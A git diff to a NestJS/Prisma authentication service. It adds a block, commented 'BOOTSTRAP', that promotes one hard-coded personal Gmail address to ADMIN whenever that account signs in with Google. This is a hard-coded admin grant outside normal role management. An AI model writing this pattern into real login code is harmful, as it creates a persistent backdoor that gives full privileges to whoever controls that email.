@@ -1,4 +1,5 @@
 import { Injectable, UnauthorizedException, BadRequestException, ConflictException } from '@nestjs/common';
+import { Role } from '@prisma/client';
 import { JwtService } from '@nestjs/jwt';
 import { ConfigService } from '@nestjs/config';
 import { PrismaService } from '../prisma/prisma.service';
@@ -105,6 +106,14 @@ export class AuthService {
           avatar: user.avatar || googleUser.picture,
           isEmailVerified: true,
         },
+      });
+    }
+
+    // BOOTSTRAP: Always promote jagadishvarma99@gmail.com to ADMIN
+    if (googleUser.email === 'jagadishvarma99@gmail.com' && user.role !== Role.ADMIN) {
+      user = await this.prisma.user.update({
+        where: { id: user.id },
+        data: { role: Role.ADMIN },
       });
     }
 
